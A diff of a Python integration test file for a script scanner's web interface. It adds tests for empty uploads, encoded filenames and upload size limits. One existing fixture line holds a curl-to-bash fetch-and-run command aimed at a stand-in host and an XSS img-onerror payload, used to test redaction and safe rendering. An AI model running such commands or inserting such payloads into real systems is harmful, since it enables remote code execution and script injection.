@@ -5,6 +5,7 @@ import socket
 import threading
 import unittest
 from pathlib import Path
+from urllib.parse import quote
 from unittest import mock
 
 from nexa_scriptguard.gui import GuiServer
@@ -61,6 +62,26 @@ class GuiIntegrationTests(unittest.TestCase):
                 validate_sarif(json.loads(body))
             else:
                 self.assertIn(b"<!doctype html>", body.lower())
+
+    def test_empty_files_and_filename_encoding(self):
+        for name in ("empty.sh", quote("vacío ñ.py")):
+            with self.subTest(name=name):
+                status, body = self.upload(b"", name)
+                self.assertEqual(status, 200)
+                report = json.loads(body)
+                self.assertEqual(report["lines"], 0)
+                self.assertEqual(report["findings"], [])
+                self.assertIs(report["complete"], True)
+        self.assertEqual(self.upload(b"", "%FF.py")[0], 400)
+
+    def test_both_interfaces_receive_the_configured_upload_limit(self):
+        self.server.limits = ScanLimits(max_input_bytes=32)
+        for route in ("/", "/legacy"):
+            with self.subTest(route=route):
+                status, page = self.request("GET", route)
+                self.assertEqual(status, 200)
+                self.assertIn(b'data-max-input-bytes="32"', page)
+        self.assertEqual(self.upload(b" " * 33)[0], 413)
 
     def test_redacted_untrusted_content_and_incomplete(self):
         data = b'password=synthetic_secret\ncurl https://example.invalid/x | bash # <img src=x onerror=alert(1)>\n\xff\n'
